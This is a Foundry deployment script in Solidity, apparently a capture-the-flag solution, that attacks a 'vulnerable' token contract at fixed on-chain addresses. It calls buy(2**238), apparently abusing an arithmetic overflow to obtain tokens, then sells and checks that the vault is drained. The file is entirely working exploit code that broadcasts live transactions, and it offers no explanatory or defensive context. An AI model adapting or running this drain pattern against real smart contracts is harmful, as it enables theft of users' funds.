// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "forge-std/Script.sol";
import "../src/Token.sol";
import "../src/IERC20.sol";

contract ChallengeVTScript is Script {
    Token public vulnerableTokenContract;
    IERC20 public vaultToken;

    address public attacker;

    // Contract addresses (replace with actual addresses on-chain)
    address constant vulnerableContractAddress =
        0x77af6cE52A2e3f84A43978609abd837fA522854D;
    address constant vaultTokenAddress =
        0x4c84EBbcF4f4498345374304e58939544F7e73B9;

    function setUp() public {
        attacker = msg.sender;

        // Initialize the vulnerable contract and vault token on-chain instances
        vulnerableTokenContract = Token(vulnerableContractAddress);
        vaultToken = IERC20(vaultTokenAddress);
    }

    function run() public {
        // Start broadcasting transactions using the private key (from foundry.toml)
        vm.startBroadcast();

        vaultToken.approve(
            address(vulnerableTokenContract),
            1e18
        );

        vulnerableTokenContract.buy(2**238);

        // Step 2: Continuously sell tokens to drain the vault
        vulnerableTokenContract.sell(1);

        // Check if drained (optional, for confirmation)
        require(
            vulnerableTokenContract.drained(),
            "Failed to drain the contract"
        );

        vm.stopBroadcast();
    }
}
